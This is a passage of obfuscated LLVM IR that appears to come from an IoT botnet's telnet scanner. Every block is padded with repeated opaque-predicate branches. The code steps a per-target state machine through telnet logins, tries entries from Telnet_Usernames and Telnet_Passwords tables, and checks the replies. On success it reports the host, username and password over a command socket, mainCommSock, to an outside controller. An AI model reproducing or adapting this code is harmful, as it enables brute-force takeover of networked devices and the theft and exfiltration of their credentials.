  %747 = icmp slt i32 %742, 10
  %748 = or i1 %746, %747
  br i1 %748, label %originalBB127, label %originalBB127alteredBB

originalBB127:                                    ; preds = %originalBB127alteredBB, %740
  %749 = load i32, i32* %2, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %750
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %751, i32 0, i32 11
  %753 = load i8*, i8** %752, align 8
  %754 = call i32 @contains_fail(i8* %753)
  %755 = icmp ne i32 %754, 0
  %756 = load i32, i32* @x.95
  %757 = load i32, i32* @y.96
  %758 = sub i32 %756, 1
  %759 = mul i32 %756, %758
  %760 = urem i32 %759, 2
  %761 = icmp eq i32 %760, 0
  %762 = icmp slt i32 %757, 10
  %763 = or i1 %761, %762
  br i1 %763, label %originalBBpart2129, label %originalBB127alteredBB

originalBBpart2129:                               ; preds = %originalBB127
  br i1 %755, label %764, label %769

; <label>:764:                                    ; preds = %originalBBpart2129
  %765 = load i32, i32* %2, align 4
  %766 = sext i32 %765 to i64
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %766
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %767, i32 0, i32 3
  store i8 0, i8* %768, align 4
  br label %790

; <label>:769:                                    ; preds = %originalBBpart2129
  %770 = load i32, i32* @x.95
  %771 = load i32, i32* @y.96
  %772 = sub i32 %770, 1
  %773 = mul i32 %770, %772
  %774 = urem i32 %773, 2
  %775 = icmp eq i32 %774, 0
  %776 = icmp slt i32 %771, 10
  %777 = or i1 %775, %776
  br i1 %777, label %originalBB131, label %originalBB131alteredBB

originalBB131:                                    ; preds = %originalBB131alteredBB, %769
  %778 = load i32, i32* %2, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %779
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %780, i32 0, i32 3
  store i8 5, i8* %781, align 4
  %782 = load i32, i32* @x.95
  %783 = load i32, i32* @y.96
  %784 = sub i32 %782, 1
  %785 = mul i32 %782, %784
  %786 = urem i32 %785, 2
  %787 = icmp eq i32 %786, 0
  %788 = icmp slt i32 %783, 10
  %789 = or i1 %787, %788
  br i1 %789, label %originalBBpart2133, label %originalBB131alteredBB

originalBBpart2133:                               ; preds = %originalBB131
  br label %790

; <label>:790:                                    ; preds = %originalBBpart2133, %764
  br label %1353

; <label>:791:                                    ; preds = %727
  %792 = load i32, i32* %2, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %793
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %794, i32 0, i32 9
  %796 = load i32, i32* %795, align 8
  %797 = add i32 %796, 6
  %798 = zext i32 %797 to i64
  %799 = call i64 @time(i64* null) #5
  %800 = icmp slt i64 %798, %799
  br i1 %800, label %801, label %826

; <label>:801:                                    ; preds = %791
  %802 = load i32, i32* @x.95
  %803 = load i32, i32* @y.96
  %804 = sub i32 %802, 1
  %805 = mul i32 %802, %804
  %806 = urem i32 %805, 2
  %807 = icmp eq i32 %806, 0
  %808 = icmp slt i32 %803, 10
  %809 = or i1 %807, %808
  br i1 %809, label %originalBB135, label %originalBB135alteredBB

originalBB135:                                    ; preds = %originalBB135alteredBB, %801
  %810 = load i32, i32* %2, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %811
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %812, i32 0, i32 3
  store i8 0, i8* %813, align 4
  %814 = load i32, i32* %2, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 4
  store i8 1, i8* %817, align 1
  %818 = load i32, i32* @x.95
  %819 = load i32, i32* @y.96
  %820 = sub i32 %818, 1
  %821 = mul i32 %818, %820
  %822 = urem i32 %821, 2
  %823 = icmp eq i32 %822, 0
  %824 = icmp slt i32 %819, 10
  %825 = or i1 %823, %824
  br i1 %825, label %originalBBpart2137, label %originalBB135alteredBB

originalBBpart2137:                               ; preds = %originalBB135
  br label %826

; <label>:826:                                    ; preds = %originalBBpart2137, %791
  %827 = load i32, i32* @x.95
  %828 = load i32, i32* @y.96
  %829 = sub i32 %827, 1
  %830 = mul i32 %827, %829
  %831 = urem i32 %830, 2
  %832 = icmp eq i32 %831, 0
  %833 = icmp slt i32 %828, 10
  %834 = or i1 %832, %833
  br i1 %834, label %originalBB139, label %originalBB139alteredBB

originalBB139:                                    ; preds = %originalBB139alteredBB, %826
  %835 = load i32, i32* @x.95
  %836 = load i32, i32* @y.96
  %837 = sub i32 %835, 1
  %838 = mul i32 %835, %837
  %839 = urem i32 %838, 2
  %840 = icmp eq i32 %839, 0
  %841 = icmp slt i32 %836, 10
  %842 = or i1 %840, %841
  br i1 %842, label %originalBBpart2141, label %originalBB139alteredBB

originalBBpart2141:                               ; preds = %originalBB139
  br label %1352

; <label>:843:                                    ; preds = %162
  %844 = load i32, i32* %2, align 4
  %845 = sext i32 %844 to i64
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %845
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %846, i32 0, i32 0
  %848 = load i32, i32* %847, align 8
  %849 = call i64 @send(i32 %848, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.863, i32 0, i32 0), i64 7, i32 16384)
  %850 = icmp slt i64 %849, 0
  br i1 %850, label %851, label %860

; <label>:851:                                    ; preds = %843
  %852 = load i32, i32* %2, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %854, i32 0, i32 3
  store i8 0, i8* %855, align 4
  %856 = load i32, i32* %2, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %857
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %858, i32 0, i32 4
  store i8 1, i8* %859, align 1
  br label %1353

; <label>:860:                                    ; preds = %843
  %861 = load i32, i32* %2, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 3
  store i8 6, i8* %864, align 4
  br label %1352

; <label>:865:                                    ; preds = %162
  %866 = load i32, i32* %2, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 0
  %870 = load i32, i32* %869, align 8
  %871 = load i32, i32* %2, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 11
  %875 = load i8*, i8** %874, align 8
  %876 = call i32 @read_until_response(i32 %870, i32 10000, i8* %875, i32 253, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %877 = icmp ne i32 %876, 0
  br i1 %877, label %878, label %995

; <label>:878:                                    ; preds = %865
  %879 = load i32, i32* @x.95
  %880 = load i32, i32* @y.96
  %881 = sub i32 %879, 1
  %882 = mul i32 %879, %881
  %883 = urem i32 %882, 2
  %884 = icmp eq i32 %883, 0
  %885 = icmp slt i32 %880, 10
  %886 = or i1 %884, %885
  br i1 %886, label %originalBB143, label %originalBB143alteredBB

originalBB143:                                    ; preds = %originalBB143alteredBB, %878
  %887 = call i64 @time(i64* null) #5
  %888 = trunc i64 %887 to i32
  %889 = load i32, i32* %2, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 9
  store i32 %888, i32* %892, align 8
  %893 = load i32, i32* %2, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 11
  %897 = load i8*, i8** %896, align 8
  %898 = call i32 @contains_fail(i8* %897)
  %899 = icmp ne i32 %898, 0
  %900 = load i32, i32* @x.95
  %901 = load i32, i32* @y.96
  %902 = sub i32 %900, 1
  %903 = mul i32 %900, %902
  %904 = urem i32 %903, 2
  %905 = icmp eq i32 %904, 0
  %906 = icmp slt i32 %901, 10
  %907 = or i1 %905, %906
  br i1 %907, label %originalBBpart2145, label %originalBB143alteredBB

originalBBpart2145:                               ; preds = %originalBB143
  br i1 %899, label %908, label %929

; <label>:908:                                    ; preds = %originalBBpart2145
  %909 = load i32, i32* @x.95
  %910 = load i32, i32* @y.96
  %911 = sub i32 %909, 1
  %912 = mul i32 %909, %911
  %913 = urem i32 %912, 2
  %914 = icmp eq i32 %913, 0
  %915 = icmp slt i32 %910, 10
  %916 = or i1 %914, %915
  br i1 %916, label %originalBB147, label %originalBB147alteredBB

originalBB147:                                    ; preds = %originalBB147alteredBB, %908
  %917 = load i32, i32* %2, align 4
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %918
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %919, i32 0, i32 3
  store i8 0, i8* %920, align 4
  %921 = load i32, i32* @x.95
  %922 = load i32, i32* @y.96
  %923 = sub i32 %921, 1
  %924 = mul i32 %921, %923
  %925 = urem i32 %924, 2
  %926 = icmp eq i32 %925, 0
  %927 = icmp slt i32 %922, 10
  %928 = or i1 %926, %927
  br i1 %928, label %originalBBpart2149, label %originalBB147alteredBB

originalBBpart2149:                               ; preds = %originalBB147
  br label %978

; <label>:929:                                    ; preds = %originalBBpart2145
  %930 = load i32, i32* @mainCommSock, align 4
  %931 = load i32, i32* %2, align 4
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %932
  %934 = call i8* @get_telstate_host(%struct.telstate_t* %933)
  %935 = load i32, i32* %2, align 4
  %936 = sext i32 %935 to i64
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %936
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %937, i32 0, i32 5
  %939 = load i8, i8* %938, align 2
  %940 = zext i8 %939 to i64
  %941 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %940
  %942 = load i8*, i8** %941, align 8
  %943 = load i32, i32* %2, align 4
  %944 = sext i32 %943 to i64
  %945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %944
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %945, i32 0, i32 6
  %947 = load i8, i8* %946, align 1
  %948 = zext i8 %947 to i64
  %949 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %948
  %950 = load i8*, i8** %949, align 8
  %951 = call i32 (i32, i8*, ...) @sockprintf(i32 %930, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.874, i32 0, i32 0), i8* %934, i8* %942, i8* %950)
  %952 = load i32, i32* @mainCommSock, align 4
  %953 = load i32, i32* %2, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %954
  %956 = call i8* @get_telstate_host(%struct.telstate_t* %955)
  %957 = load i32, i32* %2, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %959, i32 0, i32 5
  %961 = load i8, i8* %960, align 2
  %962 = zext i8 %961 to i64
  %963 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %962
  %964 = load i8*, i8** %963, align 8
  %965 = load i32, i32* %2, align 4
  %966 = sext i32 %965 to i64
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %966
  %968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %967, i32 0, i32 6
  %969 = load i8, i8* %968, align 1
  %970 = zext i8 %969 to i64
  %971 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %970
  %972 = load i8*, i8** %971, align 8
  %973 = call i32 (i32, i8*, ...) @sockprintf(i32 %952, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.865, i32 0, i32 0), i8* %956, i8* %964, i8* %972)
  %974 = load i32, i32* %2, align 4
  %975 = sext i32 %974 to i64
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %975
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %976, i32 0, i32 3
  store i8 7, i8* %977, align 4
  br label %978

; <label>:978:                                    ; preds = %929, %originalBBpart2149
  %979 = load i32, i32* @x.95
  %980 = load i32, i32* @y.96
  %981 = sub i32 %979, 1
  %982 = mul i32 %979, %981
  %983 = urem i32 %982, 2
  %984 = icmp eq i32 %983, 0
  %985 = icmp slt i32 %980, 10
  %986 = or i1 %984, %985
  br i1 %986, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %978
  %987 = load i32, i32* @x.95
  %988 = load i32, i32* @y.96
  %989 = sub i32 %987, 1
  %990 = mul i32 %987, %989
  %991 = urem i32 %990, 2
  %992 = icmp eq i32 %991, 0
  %993 = icmp slt i32 %988, 10
  %994 = or i1 %992, %993
  br i1 %994, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br label %1353

; <label>:995:                                    ; preds = %865
  %996 = load i32, i32* %2, align 4
  %997 = sext i32 %996 to i64
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %997
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %998, i32 0, i32 9
  %1000 = load i32, i32* %999, align 8
  %1001 = add i32 %1000, 7
  %1002 = zext i32 %1001 to i64
  %1003 = call i64 @time(i64* null) #5
  %1004 = icmp slt i64 %1002, %1003
  br i1 %1004, label %1005, label %1030

; <label>:1005:                                   ; preds = %995
  %1006 = load i32, i32* @x.95
  %1007 = load i32, i32* @y.96
  %1008 = sub i32 %1006, 1
  %1009 = mul i32 %1006, %1008
  %1010 = urem i32 %1009, 2
  %1011 = icmp eq i32 %1010, 0
  %1012 = icmp slt i32 %1007, 10
  %1013 = or i1 %1011, %1012
  br i1 %1013, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %1005
  %1014 = load i32, i32* %2, align 4
  %1015 = sext i32 %1014 to i64
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1015
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1016, i32 0, i32 3
  store i8 0, i8* %1017, align 4
  %1018 = load i32, i32* %2, align 4
  %1019 = sext i32 %1018 to i64
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1019
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1020, i32 0, i32 4
  store i8 1, i8* %1021, align 1
  %1022 = load i32, i32* @x.95
  %1023 = load i32, i32* @y.96
  %1024 = sub i32 %1022, 1
  %1025 = mul i32 %1022, %1024
  %1026 = urem i32 %1025, 2
  %1027 = icmp eq i32 %1026, 0
  %1028 = icmp slt i32 %1023, 10
  %1029 = or i1 %1027, %1028
  br i1 %1029, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %1030

; <label>:1030:                                   ; preds = %originalBBpart2157, %995
  %1031 = load i32, i32* @x.95
  %1032 = load i32, i32* @y.96
  %1033 = sub i32 %1031, 1
  %1034 = mul i32 %1031, %1033
  %1035 = urem i32 %1034, 2
  %1036 = icmp eq i32 %1035, 0
  %1037 = icmp slt i32 %1032, 10
  %1038 = or i1 %1036, %1037
  br i1 %1038, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %1030
  %1039 = load i32, i32* @x.95
  %1040 = load i32, i32* @y.96
  %1041 = sub i32 %1039, 1
  %1042 = mul i32 %1039, %1041
  %1043 = urem i32 %1042, 2
  %1044 = icmp eq i32 %1043, 0
  %1045 = icmp slt i32 %1040, 10
  %1046 = or i1 %1044, %1045
  br i1 %1046, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  br label %1352

; <label>:1047:                                   ; preds = %162
  call void @RemoveTempDirs()
  %1048 = load i32, i32* %2, align 4
  %1049 = sext i32 %1048 to i64
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1049
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1050, i32 0, i32 0
  %1052 = load i32, i32* %1051, align 8
  %1053 = call i64 @send(i32 %1052, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.875, i32 0, i32 0), i64 4, i32 16384)
  %1054 = icmp slt i64 %1053, 0
  br i1 %1054, label %1055, label %1064

; <label>:1055:                                   ; preds = %1047
  %1056 = load i32, i32* %2, align 4
  %1057 = sext i32 %1056 to i64
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1057
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1058, i32 0, i32 3
  store i8 0, i8* %1059, align 4
  %1060 = load i32, i32* %2, align 4
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1061
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1062, i32 0, i32 4
  store i8 1, i8* %1063, align 1
  br label %1353

; <label>:1064:                                   ; preds = %1047
  %1065 = load i32, i32* @x.95
  %1066 = load i32, i32* @y.96
  %1067 = sub i32 %1065, 1
  %1068 = mul i32 %1065, %1067
  %1069 = urem i32 %1068, 2
  %1070 = icmp eq i32 %1069, 0
  %1071 = icmp slt i32 %1066, 10
  %1072 = or i1 %1070, %1071
  br i1 %1072, label %originalBB163, label %originalBB163alteredBB

originalBB163:                                    ; preds = %originalBB163alteredBB, %1064
  %1073 = load i32, i32* %2, align 4
  %1074 = sext i32 %1073 to i64
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1074
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1075, i32 0, i32 3
  store i8 8, i8* %1076, align 4
  %1077 = load i32, i32* @x.95
  %1078 = load i32, i32* @y.96
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBBpart2165, label %originalBB163alteredBB

originalBBpart2165:                               ; preds = %originalBB163
  br label %1352

; <label>:1085:                                   ; preds = %162
  %1086 = load i32, i32* @x.95
  %1087 = load i32, i32* @y.96
  %1088 = sub i32 %1086, 1
  %1089 = mul i32 %1086, %1088
  %1090 = urem i32 %1089, 2
  %1091 = icmp eq i32 %1090, 0
  %1092 = icmp slt i32 %1087, 10
  %1093 = or i1 %1091, %1092
  br i1 %1093, label %originalBB167, label %originalBB167alteredBB

originalBB167:                                    ; preds = %originalBB167alteredBB, %1085
  %1094 = load i32, i32* %2, align 4
  %1095 = sext i32 %1094 to i64
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1095
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1096, i32 0, i32 0
  %1098 = load i32, i32* %1097, align 8
  %1099 = load i32, i32* %2, align 4
  %1100 = sext i32 %1099 to i64
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1100
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1101, i32 0, i32 11
  %1103 = load i8*, i8** %1102, align 8
  %1104 = call i32 @read_until_response(i32 %1098, i32 10000, i8* %1103, i32 253, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %1105 = icmp ne i32 %1104, 0
  %1106 = load i32, i32* @x.95
  %1107 = load i32, i32* @y.96
  %1108 = sub i32 %1106, 1
  %1109 = mul i32 %1106, %1108
  %1110 = urem i32 %1109, 2
  %1111 = icmp eq i32 %1110, 0
  %1112 = icmp slt i32 %1107, 10
  %1113 = or i1 %1111, %1112
  br i1 %1113, label %originalBBpart2169, label %originalBB167alteredBB

originalBBpart2169:                               ; preds = %originalBB167
  br i1 %1105, label %1114, label %1149

; <label>:1114:                                   ; preds = %originalBBpart2169
  %1115 = load i32, i32* %2, align 4
  %1116 = sext i32 %1115 to i64
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1116
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1117, i32 0, i32 11
  %1119 = load i8*, i8** %1118, align 8
  %1120 = call i32 @contains_fail(i8* %1119)
  %1121 = icmp ne i32 %1120, 0
  br i1 %1121, label %1122, label %1127

; <label>:1122:                                   ; preds = %1114
  %1123 = load i32, i32* %2, align 4
  %1124 = sext i32 %1123 to i64
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1124
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1125, i32 0, i32 3
  store i8 0, i8* %1126, align 4
  br label %1132

; <label>:1127:                                   ; preds = %1114
  %1128 = load i32, i32* %2, align 4
  %1129 = sext i32 %1128 to i64
  %1130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1129
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1130, i32 0, i32 3
  store i8 9, i8* %1131, align 4
  br label %1132

; <label>:1132:                                   ; preds = %1127, %1122
  %1133 = load i32, i32* @x.95
  %1134 = load i32, i32* @y.96
  %1135 = sub i32 %1133, 1
  %1136 = mul i32 %1133, %1135
  %1137 = urem i32 %1136, 2
  %1138 = icmp eq i32 %1137, 0
  %1139 = icmp slt i32 %1134, 10
  %1140 = or i1 %1138, %1139
  br i1 %1140, label %originalBB171, label %originalBB171alteredBB

originalBB171:                                    ; preds = %originalBB171alteredBB, %1132
  %1141 = load i32, i32* @x.95
  %1142 = load i32, i32* @y.96
  %1143 = sub i32 %1141, 1
  %1144 = mul i32 %1141, %1143
  %1145 = urem i32 %1144, 2
  %1146 = icmp eq i32 %1145, 0
  %1147 = icmp slt i32 %1142, 10
  %1148 = or i1 %1146, %1147
  br i1 %1148, label %originalBBpart2173, label %originalBB171alteredBB

originalBBpart2173:                               ; preds = %originalBB171
  br label %1353

; <label>:1149:                                   ; preds = %originalBBpart2169
  %1150 = load i32, i32* %2, align 4
  %1151 = sext i32 %1150 to i64
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1151
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1152, i32 0, i32 9
  %1154 = load i32, i32* %1153, align 8
  %1155 = add i32 %1154, 6
  %1156 = zext i32 %1155 to i64
  %1157 = call i64 @time(i64* null) #5
  %1158 = icmp slt i64 %1156, %1157
  br i1 %1158, label %1159, label %1184

; <label>:1159:                                   ; preds = %1149
  %1160 = load i32, i32* @x.95
  %1161 = load i32, i32* @y.96
  %1162 = sub i32 %1160, 1
  %1163 = mul i32 %1160, %1162
  %1164 = urem i32 %1163, 2
  %1165 = icmp eq i32 %1164, 0
  %1166 = icmp slt i32 %1161, 10
  %1167 = or i1 %1165, %1166
  br i1 %1167, label %originalBB175, label %originalBB175alteredBB

originalBB175:                                    ; preds = %originalBB175alteredBB, %1159
  %1168 = load i32, i32* %2, align 4
  %1169 = sext i32 %1168 to i64
  %1170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1169
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1170, i32 0, i32 3
  store i8 0, i8* %1171, align 4
  %1172 = load i32, i32* %2, align 4
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1173
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1174, i32 0, i32 4
  store i8 1, i8* %1175, align 1
  %1176 = load i32, i32* @x.95
  %1177 = load i32, i32* @y.96
  %1178 = sub i32 %1176, 1
  %1179 = mul i32 %1176, %1178
  %1180 = urem i32 %1179, 2
  %1181 = icmp eq i32 %1180, 0
  %1182 = icmp slt i32 %1177, 10
  %1183 = or i1 %1181, %1182
  br i1 %1183, label %originalBBpart2177, label %originalBB175alteredBB

originalBBpart2177:                               ; preds = %originalBB175
  br label %1184

; <label>:1184:                                   ; preds = %originalBBpart2177, %1149
  %1185 = load i32, i32* @x.95
  %1186 = load i32, i32* @y.96
  %1187 = sub i32 %1185, 1
  %1188 = mul i32 %1185, %1187
  %1189 = urem i32 %1188, 2
  %1190 = icmp eq i32 %1189, 0
  %1191 = icmp slt i32 %1186, 10
  %1192 = or i1 %1190, %1191
  br i1 %1192, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %1184
  %1193 = load i32, i32* @x.95
  %1194 = load i32, i32* @y.96
  %1195 = sub i32 %1193, 1
  %1196 = mul i32 %1193, %1195
  %1197 = urem i32 %1196, 2
  %1198 = icmp eq i32 %1197, 0
  %1199 = icmp slt i32 %1194, 10
  %1200 = or i1 %1198, %1199
  br i1 %1200, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br label %1352

; <label>:1201:                                   ; preds = %162
  %1202 = load i32, i32* %2, align 4
  %1203 = sext i32 %1202 to i64
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1203
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1204, i32 0, i32 0
  %1206 = load i32, i32* %1205, align 8
  %1207 = call i64 @send(i32 %1206, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.876, i32 0, i32 0), i64 12, i32 16384)
  %1208 = icmp slt i64 %1207, 0
  br i1 %1208, label %1209, label %1234

; <label>:1209:                                   ; preds = %1201
  %1210 = load i32, i32* @x.95
  %1211 = load i32, i32* @y.96
  %1212 = sub i32 %1210, 1
  %1213 = mul i32 %1210, %1212
  %1214 = urem i32 %1213, 2
  %1215 = icmp eq i32 %1214, 0
  %1216 = icmp slt i32 %1211, 10
  %1217 = or i1 %1215, %1216
  br i1 %1217, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %1209
  %1218 = load i32, i32* %2, align 4
  %1219 = sext i32 %1218 to i64
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1219
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1220, i32 0, i32 3
  store i8 0, i8* %1221, align 4
  %1222 = load i32, i32* %2, align 4
  %1223 = sext i32 %1222 to i64
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1223
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1224, i32 0, i32 4
  store i8 1, i8* %1225, align 1
  %1226 = load i32, i32* @x.95
  %1227 = load i32, i32* @y.96
  %1228 = sub i32 %1226, 1
  %1229 = mul i32 %1226, %1228
  %1230 = urem i32 %1229, 2
  %1231 = icmp eq i32 %1230, 0
  %1232 = icmp slt i32 %1227, 10
  %1233 = or i1 %1231, %1232
  br i1 %1233, label %originalBBpart2185, label %originalBB183alteredBB

originalBBpart2185:                               ; preds = %originalBB183
  br label %1353

; <label>:1234:                                   ; preds = %1201
  %1235 = load i32, i32* %2, align 4
  %1236 = sext i32 %1235 to i64
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1236
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1237, i32 0, i32 3
  store i8 10, i8* %1238, align 4
  br label %1352

; <label>:1239:                                   ; preds = %162
  %1240 = load i32, i32* @x.95
  %1241 = load i32, i32* @y.96
  %1242 = sub i32 %1240, 1
  %1243 = mul i32 %1240, %1242
  %1244 = urem i32 %1243, 2
  %1245 = icmp eq i32 %1244, 0
  %1246 = icmp slt i32 %1241, 10
  %1247 = or i1 %1245, %1246
  br i1 %1247, label %originalBB187, label %originalBB187alteredBB

originalBB187:                                    ; preds = %originalBB187alteredBB, %1239
  %1248 = call i64 @time(i64* null) #5
  %1249 = trunc i64 %1248 to i32
  %1250 = load i32, i32* %2, align 4
  %1251 = sext i32 %1250 to i64
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1251
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1252, i32 0, i32 9
  store i32 %1249, i32* %1253, align 8
  %1254 = load i32, i32* %2, align 4
  %1255 = sext i32 %1254 to i64
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1255
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1256, i32 0, i32 0
